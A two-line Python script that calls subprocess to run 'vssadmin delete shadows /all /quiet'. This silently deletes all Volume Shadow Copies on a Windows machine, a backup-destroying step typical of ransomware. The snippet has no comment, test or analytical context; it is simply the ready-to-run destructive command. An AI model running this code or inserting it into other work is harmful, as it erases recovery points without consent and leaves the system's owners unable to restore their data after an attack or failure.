import subprocess
subprocess.run(["vssadmin", "delete", "shadows", "/all", "/quiet"])
